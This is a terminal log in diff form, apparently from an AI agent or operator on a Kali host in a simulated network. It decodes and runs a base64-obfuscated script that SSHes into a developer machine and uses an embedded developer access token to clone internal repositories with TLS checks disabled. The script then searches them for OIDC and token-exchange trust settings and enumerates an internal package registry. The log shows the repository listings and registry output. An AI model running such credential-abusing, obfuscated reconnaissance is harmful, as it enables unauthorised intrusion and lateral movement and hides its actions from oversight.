@@ -1,0 +1,59 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/k14_r8.sh <<'B64EOF'
+> c2V0ICtlCnNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBDb25uZWN0VGltZW91dD04IHJvd2FuLWRldiAnYmFzaCAtcycgPDwnUlNIJwpzZXQgK2UKRz1odHRwczovL3NvdXJjZS5rZXBsZXJvcHMudGVzdApVPSdyb3dhbi5pdG86ZmtfZGV2ZWxvcGVyX3lVV1RLU3FyYzE2eTNLNV81RGZRN3FhY2Z0OWItOXhvJwpjZCAvdG1wCmZvciByIGluIGZpZWxka2VzdC9jb25uZWN0b3ItYXJjaGl2ZSBmaWVsZGtlc3QvcG9saWN5LWNvbXBpbGVyIGZpZWxka2VzdC9yZWxlYXNlLXNpZ25lci1oaXN0b3J5IGZpZWxka2VzdC9maWVsZGxpbmstY29ubmVjdG9yOyBkbwogbj0kKGJhc2VuYW1lICRyKQogaWYgWyAhIC1kIC90bXAvZ3ItJG4gXTsgdGhlbgogICBnaXQgLWMgaHR0cC5zc2xWZXJpZnk9ZmFsc2UgY2xvbmUgLXEgImh0dHBzOi8vcm93YW4uaXRvOmZrX2RldmVsb3Blcl95VVdUS1NxcmMxNnkzSzVfNURmUTdxYWNmdDliLTl4b0Bzb3VyY2Uua2VwbGVyb3BzLnRlc3QvJHIuZ2l0IiAvdG1wL2dyLSRuIDI+JjEgfCBoZWFkIC0zCiBmaQpkb25lCmVjaG8gIj09PSBSRVBPIEZJTEVTID09PSIKZm9yIGQgaW4gL3RtcC9nci0qOyBkbyBlY2hvICIjIyMgJGQiOyBmaW5kICRkIC10eXBlIGYgLW5vdCAtcGF0aCAnKi8uZ2l0LyonIHwgaGVhZCAtNDA7IGRvbmUKZWNobyAiPT09IEdSRVAgVFJVU1QvV09SS0xPQUQvQVVESUVOQ0UgPT09IgpncmVwIC1ySW4gLWkgLUUgJ3RydXN0fHdvcmtsb2FkfGF1ZGllbmNlfHRva2VuLWV4Y2hhbmdlfGFzc3VtZXxvaWRjfGV4Y2hhbmdlJyAvdG1wL2dyLSogLS1leGNsdWRlLWRpcj0uZ2l0IDI+L2Rldi9udWxsIHwgaGVhZCAtODAKZWNobyAiPT09IE5QTSBTRUFSQ0ggPT09IgpOPWh0dHBzOi8vcGFja2FnZXMua2VwbGVyb3BzLnRlc3QKZm9yIHEgaW4gZmllbGRrZXN0IHdvcmtsb2FkIHRydXN0IGlkZW50aXR5IGNsb3VkOyBkbwogZWNobyAiLS0gJHEiOyBjdXJsIC1zU2sgLW0gOCAtdSAiJFUiICIkTi8tL3YxL3NlYXJjaD90ZXh0PSRxJnNpemU9MjAiIHwgaGVhZCAtYyAxMjAwOyBlY2hvCmRvbmUKZWNobyAiPT09IE5QTSBBTEwgUFJFRklYRVMgPT09IgpjdXJsIC1zU2sgLW0gOCAtdSAiJFUiICIkTi8tL2FsbCIgfCBoZWFkIC1jIDIwMDA7IGVjaG8KUlNICmVjaG8gRE9ORV9LMTRfUjgK
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/k14_r8.sh; bash /tmp/k14_r8.sh; echo DONEMARK_1795199737237$((6*7))
+=== REPO FILES ===
+### /tmp/gr-connector-archive
+/tmp/gr-connector-archive/notes/retained-diagnostic.md
+/tmp/gr-connector-archive/maps/fieldlink-connector-6.9.8.map
+/tmp/gr-connector-archive/internal/fieldlink/legacy-diagnostics/CRR-OG2/ENT-ARWC-DIAG-0698.json
+/tmp/gr-connector-archive/internal/fieldlink/legacy-diagnostics/CRR-OG2/ENG-FLK-LEGACY-42.md
+/tmp/gr-connector-archive/examples/fieldkest.bin
+/tmp/gr-connector-archive/examples/empty.bin
+/tmp/gr-connector-archive/examples/bytes-00-0f.bin
+/tmp/gr-connector-archive/config/ordinary.conf
+/tmp/gr-connector-archive/config/diagnostic.conf
+/tmp/gr-connector-archive/bin/fieldlink-connector
+/tmp/gr-connector-archive/README.md
+### /tmp/gr-fieldlink-connector
+/tmp/gr-fieldlink-connector/tests/test_crr_og2_report.py
+/tmp/gr-fieldlink-connector/review/FLK-7.4.2.md
+/tmp/gr-fieldlink-connector/docs/report-provider.md
+/tmp/gr-fieldlink-connector/README.md
+### /tmp/gr-policy-compiler
+/tmp/gr-policy-compiler/maps/fieldkest-policyc-2.6.4.map
+/tmp/gr-policy-compiler/examples/rejected-incomplete.env
+/tmp/gr-policy-compiler/corpus/policy-corpus-2026-09-r4.json
+/tmp/gr-policy-compiler/bin/fieldkest-policyc
+/tmp/gr-policy-compiler/api/program-model-template.json
+/tmp/gr-policy-compiler/api/opcode-model-template.json
+/tmp/gr-policy-compiler/api/fragment-assembly-guide.json
+/tmp/gr-policy-compiler/api/corpus-check-template.json
+/tmp/gr-policy-compiler/api/condition-set-template.json
+/tmp/gr-policy-compiler/api/accept-template.json
+/tmp/gr-policy-compiler/README.md
+### /tmp/gr-release-signer-history
+/tmp/gr-release-signer-history/release-public-key.json
+/tmp/gr-release-signer-history/README.md
+=== GREP TRUST/WORKLOAD/AUDIENCE ===
+=== NPM SEARCH ===
+-- fieldkest
+{"objects":[],"total":0,"time":"Fri, 20 Nov 2026 18:35:56 GMT"}
+-- workload
+{"objects":[],"total":0,"time":"Fri, 20 Nov 2026 18:35:56 GMT"}
+-- trust
+{"objects":[],"total":0,"time":"Fri, 20 Nov 2026 18:35:56 GMT"}
+-- identity
+{"objects":[],"total":0,"time":"Fri, 20 Nov 2026 18:35:56 GMT"}
+-- cloud
+{"objects":[],"total":0,"time":"Fri, 20 Nov 2026 18:35:56 GMT"}
+=== NPM ALL PREFIXES ===
+{"_updated":99999,
+"@keplerops/fieldlink-connector":{"name":"@keplerops/fieldlink-connector","description":"FieldLink field-device diagnostic summary connector","dist-tags":{"latest":"7.4.2"},"maintainers":[],"readmeFilename":"README.md","time":{"modified":"2026-11-19T13:49:20.256Z"},"license":"UNLICENSED","versions":{"7.4.2":"latest"}}}
+
+DONE_K14_R8
